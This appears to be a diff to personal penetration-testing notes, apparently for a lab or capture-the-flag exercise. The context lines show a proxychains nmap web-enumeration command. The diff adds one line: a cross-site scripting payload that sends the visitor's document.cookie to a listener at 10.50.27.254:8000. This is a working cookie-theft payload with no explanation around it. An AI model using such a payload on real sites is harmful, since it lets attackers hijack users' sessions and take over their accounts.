@@ -82,8 +82,9 @@ On firefox type loopback followed by colon and fowarded port (127.0.0.1:port)
 proxychains nmap --script=http-enum.nse 192.168.28.100
 ```
 
-
-
+```
+<script>document.location="http://10.50.27.254:8000/"+document.cookie;</script>
+```
 
 
 
